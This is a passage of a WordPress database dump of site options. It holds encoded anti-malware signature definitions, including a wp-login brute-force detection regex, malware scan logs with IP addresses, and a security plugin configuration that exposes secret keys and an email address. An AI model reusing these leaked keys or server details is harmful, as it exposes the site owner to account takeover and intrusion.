jtzOjM3OiJiYTMyOTM5NzBlMTNiMDNhMmVhOTJmNWI2YjViZjU=NE8zMzc3IjtzOjU6IkUyMk5xIjtzOjM3OiI2M2IwYWVkOWIwMmY4NzlhNmUwMjk1ZmJlYTdkYjg1NE8=NzAyIjtzOjU6IkUyMzBEIjtzOjM3OiJlZjQxODhjYjBiNjBhNzIwMTdmNGM4YTFlODQwYWIxZU8yOTUwIjtzOjU6IkUyNDlMIjtzOjM3OiJmYjhiZjY3ODVlNTVlOWUzOWJlYTU1MjYzNWM=MmE2NE8zMjcwIjtzOjU6IkUyNjBDIjtzOjM5OiJhY2IzMzMyOWI5ZWY4YWFiZDhiZDczMTQyNjgwM2U=ZU8yMzI=ODIiO3M6NToiRTI2MEUiO3M6Mzg6IjZjZWI2NDc1OTI1ODhiY2Y=NjNiZWZkOTQwOGUyN2FkTzEyMDI1IjtzOjU6IkUyNjBIIjtzOjM3OiI1YTMxODI3N2ZlZGY=OTFhMDMwMWUxNzdhOWVmMTBiM=8=OTA4IjtzOjU6IkUyNjBKIjtzOjM4OiJkYmMzODA4NDczZGVmMDBmY2U=NWZlNTY=ZGM3MmRjYk8xNDcyMCI7czo1OiJFMjYwSyI7czozNzoiYjk4OWE1YmQ4NGY2ZWJjYmMxMzkzZWMwMDNlNmU5OTFPNDk2OSI7czo1OiJFMjdFRyI7czozODoiMDMwYjgzODkzNzZhNDJmZjNkYTE4NmJmNjU4MDYyMTdPMTY1MzEiO3M6NToiRTI5RDIiO3M6Mzc6ImRlZjI1N2RiYjBhYjgwNWM=OTk2ZmQ4YWJiMWE2YjQ5TzY3MTciO3M6NToiRTJINW4iO3M6Mzg6Ijc=ZDkwMzA=OTY4M2U1YmJlYTljY2I3NTQ=YTQyYmNhTzE3NDEzIjtzOjU6IkU1RURxIjtzOjM4OiI2MDNiZDE=Mjk5ZjYxYTczMjliMmQzNTNiMmI1NmMyZk8zNzY4OSI7czo1OiJFNUVEcCI7czozNzoiMDQyNmIzOTc1NGFhNmJjNzY2ZDg5ZWE=YzQxYmJkMDZPMzQ1NyI7czo1OiJFNUVEeCI7czozODoiZWFkYzU4MzI1MTNkNTY3MDg4NGE5NzVjNmRlMTBmMDFPMTk2MTUiO3M6NToiRTdVTUEiO3M6Mzg6IjM4ZGJjYzkyNTUyOTM2ODgxMmY1YzJmYmNiMzg5NjE2TzE=OTY1IjtzOjU6IkU3VU1CIjtzOjM3OiJhMWMxODIyN2U2ZTkzNzk4YzQ5M2FlZDk2ZWU2Y2M4NE8zMjY3IjtzOjU6IkU3VU1CIjtzOjM3OiIwNzgzODhhNjQzMWFhNWIwODM4YTg3MzJkMTg3ZmUyOU84OTEzIjtzOjU6IkU4QUFwIjtzOjM3OiJmM2IxYjI4NDI=MzZmN2EzMTFiMzllNGVmNGI=N2Y1OU8=MzUyIjtzOjU6IkU4QkJVIjtzOjM3OiJkNzA5NDA2MTlhOTlkNTU1MTE2MTY3ZDRmYjM5Y2ExNU8=Mzk3IjtzOjU6IkU5Q=x4IjtzOjM4OiJjYmRiZmM5MTg=ZDI4YWM1NWY4M2MwYjBkZjQwZmQ=M=83OTQxNCI7czo1OiJFOUc4aiI7czozODoiZWYzYWU5MDE=NTI1Y2Y4MTE4N2FmYWE2MWJjYTczN2VPMzc2OTEiO3M6NToiRUNDRTEiO3M6Mzg6ImY=NDhjNTkzYzI=MmQxMzRlOTczM2E4NGM3YTRkMjZjTzE1MjQ4IjtzOjU6IkVDSDlYIjtzOjM5OiI1MWJiYTBkNTMzM2RlNGZkYTA5NTRmNTFlYTM1NWE1ME8xMDY3OTciO3M6NToiRjJBOFUiO3M6Mzg6IjY5MmY4ZTg2MWJhZmEzMWZiZjFiMzgwNWI=YjBkN2QzTzE1MDE2IjtzOjU6IkY=NkloIjtzOjM4OiJkODQyMzNkZDI5MzcxN2YwYTA3YjU1OGIyZmUzOGY1Nk8xNTA1MyI7czo1OiJGOUFBQiI7fX1zOjg6IndwX2xvZ2luIjthOjE6e3M6MzY6ImJydXRlIGZvcmNlIHBvc3NpYmxlIG9uIHdwLWxvZ2luLnBocCI7YToyOntpOjA7czo1OiJENE9BQiI7aToxO3M6MTc1OiIvLio_cmVxdWlyZVwoWyBcdF=qZGlybmFtZVwoX19GSUxFX19cKVsgXHRdKlwuWyBcdF=qWyInXVwvd3BcLWxvYWRcLnBocFsiJ11bIFx=XSpcKTsoPyFcL1wvMjAxMy=wNC=yNCBETyBOT1QgUkVNT1ZFIFRISVMgUkVRVUlSRUQgTElORSlbXlxuXSooW1xyXG4gXHRdKlwkX1NFU1NJT=5cW1teO1=rOykqL2lzIjt9fX=2","yes");
INSERT INTO `cmrfu_options` VALUES("21127","_site_transient_update_core","O:8:\"stdClass\":4:{s:7:\"updates\";a:1:{i:0;O:8:\"stdClass\":10:{s:8:\"response\";s:6:\"latest\";s:8:\"download\";s:65:\"https://downloads.wordpress.org/release/tr_TR/wordpress-4.7.3.zip\";s:6:\"locale\";s:5:\"tr_TR\";s:8:\"packages\";O:8:\"stdClass\":5:{s:4:\"full\";s:65:\"https://downloads.wordpress.org/release/tr_TR/wordpress-4.7.3.zip\";s:10:\"no_content\";b:0;s:11:\"new_bundled\";b:0;s:7:\"partial\";b:0;s:8:\"rollback\";b:0;}s:7:\"current\";s:5:\"4.7.3\";s:7:\"version\";s:5:\"4.7.3\";s:11:\"php_version\";s:5:\"5.2.4\";s:13:\"mysql_version\";s:3:\"5.0\";s:11:\"new_bundled\";s:3:\"4.7\";s:15:\"partial_version\";s:0:\"\";}}s:12:\"last_checked\";i:1490267698;s:15:\"version_checked\";s:5:\"4.7.3\";s:12:\"translations\";a:0:{}}","no");
INSERT INTO `cmrfu_options` VALUES("21074","_site_transient_timeout_browser_2d20cdec9e46ccf938fa2266bead68d1","1490780889","no");
INSERT INTO `cmrfu_options` VALUES("21075","_site_transient_browser_2d20cdec9e46ccf938fa2266bead68d1","a:9:{s:8:\"platform\";s:9:\"Macintosh\";s:4:\"name\";s:6:\"Chrome\";s:7:\"version\";s:12:\"56.0.2924.87\";s:10:\"update_url\";s:28:\"http://www.google.com/chrome\";s:7:\"img_src\";s:49:\"http://s.wordpress.org/images/browsers/chrome.png\";s:11:\"img_src_ssl\";s:48:\"https://wordpress.org/images/browsers/chrome.png\";s:15:\"current_version\";s:2:\"18\";s:7:\"upgrade\";b:0;s:8:\"insecure\";b:0;}","no");
INSERT INTO `cmrfu_options` VALUES("15517","wpseo_sitemap_1_cache_validator","3ytVl","no");
INSERT INTO `cmrfu_options` VALUES("15518","wpseo_sitemap_page_cache_validator","fX2","no");
INSERT INTO `cmrfu_options` VALUES("15523","wpseo_sitemap_category_cache_validator","2ijcc","no");
INSERT INTO `cmrfu_options` VALUES("15526","wpseo_sitemap_post_cache_validator","3ytVn","no");
INSERT INTO `cmrfu_options` VALUES("15869","GOTMLS_scan_log/176.232.0.63/1479324693.9969","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:3:{i:0;s:8:\"backdoor\";i:1;s:5:\"known\";i:2;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1479324740;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:1112;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1479325852.1991961;s:6:\"finish\";i:1479325852;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15714","GOTMLS_scan_log/176.233.124.87/1478538588.1549","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:3:{i:0;s:8:\"backdoor\";i:1;s:5:\"known\";i:2;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1478538588;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:15854;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1478554440.2240629;s:6:\"finish\";i:1478554442;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15543","GOTMLS_scan_log/176.233.127.40/1477928531.4918","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:4:\"80px\";i:1;s:4:\"40px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:28:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:0:{}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:2:{i:0;s:8:\"backdoor\";i:1;s:5:\"known\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1477928532;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:2082;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1477930614.3939719;s:6:\"finish\";i:1477930614;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15554","wpseo_sitemap_author_cache_validator","6CeaH","no");
INSERT INTO `cmrfu_options` VALUES("15557","wpseo_sitemap_attachment_cache_validator","4LWQ","no");
INSERT INTO `cmrfu_options` VALUES("19423","wpseo_sitemap_slider_cache_validator","6CL59","no");
INSERT INTO `cmrfu_options` VALUES("15560","wpseo_sitemap_portfolio_category_cache_validator","4Tnx","no");
INSERT INTO `cmrfu_options` VALUES("19404","GOTMLS_scan_log/78.135.9.22/1486214523.6116","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:15:\"skip_quarantine\";i:0;s:5:\"check\";a:5:{i:0;s:8:\"htaccess\";i:1;s:8:\"timthumb\";i:2;s:8:\"backdoor\";i:3;s:5:\"known\";i:4;s:9:\"potential\";}}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1486214553;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:1567;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1486216120.7317319;s:6:\"finish\";i:1486216120;}}","yes");
INSERT INTO `cmrfu_options` VALUES("19392","can_compress_scripts","1","no");
INSERT INTO `cmrfu_options` VALUES("15565","wpseo_sitemap_portfolio_cache_validator","5Y1s","no");
INSERT INTO `cmrfu_options` VALUES("15661","wpseo_sitemap_revision_cache_validator","fX9","no");
INSERT INTO `cmrfu_options` VALUES("15620","GOTMLS_scan_log/78.135.61.182/1478188580.6514","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:4:\"80px\";i:1;s:4:\"40px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:3:{i:0;s:8:\"backdoor\";i:1;s:5:\"known\";i:2;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1478188581;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:1504;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1478190085.5986559;s:6:\"finish\";i:1478190085;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15876","aiowpsec_db_version","1.8","yes");
INSERT INTO `cmrfu_options` VALUES("15877","aio_wp_security_configs","a:81:{s:19:\"aiowps_enable_debug\";s:0:\"\";s:36:\"aiowps_remove_wp_generator_meta_info\";s:0:\"\";s:25:\"aiowps_prevent_hotlinking\";s:1:\"1\";s:28:\"aiowps_enable_login_lockdown\";s:0:\"\";s:28:\"aiowps_allow_unlock_requests\";s:0:\"\";s:25:\"aiowps_max_login_attempts\";s:1:\"3\";s:24:\"aiowps_retry_time_period\";s:1:\"5\";s:26:\"aiowps_lockout_time_length\";s:2:\"60\";s:28:\"aiowps_set_generic_login_msg\";s:0:\"\";s:26:\"aiowps_enable_email_notify\";s:0:\"\";s:20:\"aiowps_email_address\";s:22:\"info@pistonkafalar.com\";s:27:\"aiowps_enable_forced_logout\";s:0:\"\";s:25:\"aiowps_logout_time_period\";s:2:\"60\";s:39:\"aiowps_enable_invalid_username_lockdown\";s:0:\"\";s:43:\"aiowps_instantly_lockout_specific_usernames\";a:0:{}s:32:\"aiowps_unlock_request_secret_key\";s:20:\"af4wfq0mnfkoa0rg2zyq\";s:26:\"aiowps_enable_whitelisting\";s:0:\"\";s:27:\"aiowps_allowed_ip_addresses\";s:0:\"\";s:27:\"aiowps_enable_login_captcha\";s:1:\"1\";s:34:\"aiowps_enable_custom_login_captcha\";s:1:\"1\";s:25:\"aiowps_captcha_secret_key\";s:20:\"4vzmvskdx651vpprw8k4\";s:42:\"aiowps_enable_manual_registration_approval\";s:0:\"\";s:39:\"aiowps_enable_registration_page_captcha\";s:1:\"1\";s:27:\"aiowps_enable_random_prefix\";s:0:\"\";s:31:\"aiowps_enable_automated_backups\";s:1:\"1\";s:26:\"aiowps_db_backup_frequency\";i:2;s:25:\"aiowps_db_backup_interval\";s:1:\"1\";s:26:\"aiowps_backup_files_stored\";i:2;s:32:\"aiowps_send_backup_email_address\";s:0:\"\";s:27:\"aiowps_backup_email_address\";s:22:\"info@pistonkafalar.com\";s:27:\"aiowps_disable_file_editing\";s:1:\"1\";s:37:\"aiowps_prevent_default_wp_file_access\";s:1:\"1\";s:22:\"aiowps_system_log_file\";s:9:\"error_log\";s:26:\"aiowps_enable_blacklisting\";s:0:\"\";s:26:\"aiowps_banned_ip_addresses\";s:0:\"\";s:28:\"aiowps_enable_basic_firewall\";s:1:\"1\";s:31:\"aiowps_enable_pingback_firewall\";s:1:\"1\";s:38:\"aiowps_disable_xmlrpc_pingback_methods\";s:1:\"1\";s:34:\"aiowps_block_debug_log_file_access\";s:1:\"1\";s:26:\"aiowps_disable_index_views\";s:1:\"1\";s:30:\"aiowps_disable_trace_and_track\";s:1:\"1\";s:28:\"aiowps_forbid_proxy_comments\";s:1:\"1\";s:29:\"aiowps_deny_bad_query_strings\";s:1:\"1\";s:34:\"aiowps_advanced_char_string_filter\";s:1:\"1\";s:25:\"aiowps_enable_5g_firewall\";s:1:\"1\";s:25:\"aiowps_enable_6g_firewall\";s:1:\"1\";s:26:\"aiowps_enable_custom_rules\";s:0:\"\";s:19:\"aiowps_custom_rules\";s:0:\"\";s:25:\"aiowps_enable_404_logging\";s:0:\"\";s:28:\"aiowps_enable_404_IP_lockout\";s:0:\"\";s:30:\"aiowps_404_lockout_time_length\";s:2:\"60\";s:28:\"aiowps_404_lock_redirect_url\";s:16:\"http://127.0.0.1\";s:31:\"aiowps_enable_rename_login_page\";s:0:\"\";s:28:\"aiowps_enable_login_honeypot\";s:0:\"\";s:43:\"aiowps_enable_brute_force_attack_prevention\";s:0:\"\";s:30:\"aiowps_brute_force_secret_word\";s:0:\"\";s:24:\"aiowps_cookie_brute_test\";s:0:\"\";s:44:\"aiowps_cookie_based_brute_force_redirect_url\";s:16:\"http://127.0.0.1\";s:59:\"aiowps_brute_force_attack_prevention_pw_protected_exception\";s:0:\"\";s:51:\"aiowps_brute_force_attack_prevention_ajax_exception\";s:0:\"\";s:19:\"aiowps_site_lockout\";s:0:\"\";s:23:\"aiowps_site_lockout_msg\";s:0:\"\";s:30:\"aiowps_enable_spambot_blocking\";s:0:\"\";s:29:\"aiowps_enable_comment_captcha\";s:0:\"\";s:31:\"aiowps_enable_autoblock_spam_ip\";s:0:\"\";s:33:\"aiowps_spam_ip_min_comments_block\";s:0:\"\";s:32:\"aiowps_enable_automated_fcd_scan\";s:1:\"1\";s:25:\"aiowps_fcd_scan_frequency\";i:4;s:24:\"aiowps_fcd_scan_interval\";s:1:\"2\";s:28:\"aiowps_fcd_exclude_filetypes\";s:0:\"\";s:24:\"aiowps_fcd_exclude_files\";s:0:\"\";s:26:\"aiowps_send_fcd_scan_email\";s:0:\"\";s:29:\"aiowps_fcd_scan_email_address\";s:22:\"info@pistonkafalar.com\";s:27:\"aiowps_fcds_change_detected\";b:0;s:22:\"aiowps_copy_protection\";s:0:\"\";s:40:\"aiowps_prevent_site_display_inside_frame\";s:0:\"\";s:32:\"aiowps_prevent_users_enumeration\";s:0:\"\";s:28:\"aiowps_block_fake_googlebots\";s:1:\"1\";s:23:\"aiowps_last_backup_time\";s:19:\"2017-03-21 17:02:28\";s:35:\"aiowps_enable_lost_password_captcha\";s:1:\"1\";s:25:\"aiowps_last_fcd_scan_time\";s:19:\"2017-03-19 16:26:36\";}","yes");
INSERT INTO `cmrfu_options` VALUES("15621","GOTMLS_scan_log/78.135.61.182/1478191481.0475","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:3:{i:0;s:8:\"backdoor\";i:1;s:5:\"known\";i:2;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1478191482;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:1517;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1478192999.6979289;s:6:\"finish\";i:1478192999;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15887","wpseo_onpage","a:2:{s:6:\"status\";i:1;s:10:\"last_fetch\";i:1490216054;}","yes");
INSERT INTO `cmrfu_options` VALUES("15885","wpseo_flush_rewrite","1","yes");
INSERT INTO `cmrfu_options` VALUES("19408","GOTMLS_scan_log/93.182.74.22/1486214523.6116","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:15:\"skip_quarantine\";i:0;s:5:\"check\";a:5:{i:0;s:8:\"htaccess\";i:1;s:8:\"timthumb\";i:2;s:8:\"backdoor\";i:3;s:5:\"known\";i:4;s:9:\"potential\";}}s:4:\"scan\";a:7:{s:5:\"start\";i:1486241528;s:9:\"microtime\";d:2193;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1486243721.044626;s:6:\"finish\";i:1486243721;s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:4:\"type\";s:13:\"Complete Scan\";}}","yes");
INSERT INTO `cmrfu_options` VALUES("20465","_site_transient_timeout_available_translations","1489144881","no");
INSERT INTO `cmrfu_options` VALUES("20466","_site_transient_available_translations","a:108:{s:2:\"af\";a:8:{s:8:\"language\";s:2:\"af\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:38:06\";s:12:\"english_name\";s:9:\"Afrikaans\";s:11:\"native_name\";s:9:\"Afrikaans\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/af.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"af\";i:2;s:3:\"afr\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:10:\"Gaan voort\";}}s:2:\"ar\";a:8:{s:8:\"language\";s:2:\"ar\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:49:08\";s:12:\"english_name\";s:6:\"Arabic\";s:11:\"native_name\";s:14:\"العربية\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/ar.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ar\";i:2;s:3:\"ara\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:16:\"المتابعة\";}}s:3:\"ary\";a:8:{s:8:\"language\";s:3:\"ary\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2017-01-26 15:42:35\";s:12:\"english_name\";s:15:\"Moroccan Arabic\";s:11:\"native_name\";s:31:\"العربية المغربية\";s:7:\"package\";s:62:\"https://downloads.wordpress.org/translation/core/4.7.2/ary.zip\";s:3:\"iso\";a:2:{i:1;s:2:\"ar\";i:3;s:3:\"ary\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:16:\"المتابعة\";}}s:2:\"as\";a:8:{s:8:\"language\";s:2:\"as\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-11-22 18:59:07\";s:12:\"english_name\";s:8:\"Assamese\";s:11:\"native_name\";s:21:\"অসমীয়া\";s:7:\"package\";s:61:\"https://downloads.wordpress.org/translation/core/4.7.2/as.zip\";s:3:\"iso\";a:3:{i:1;s:2:\"as\";i:2;s:3:\"asm\";i:3;s:3:\"asm\";}s:7:\"strings\";a:1:{s:8:\"continue\";s:0:\"\";}}s:2:\"az\";a:8:{s:8:\"language\";s:2:\"az\";s:7:\"version\";s:5:\"4.7.2\";s:7:\"updated\";s:19:\"2016-11-06 00:09:27\";s:12:\"english_name\";s:11:\"Azerbaijani\";s:11:\"native_name\";s:16:\"Azərbaycan 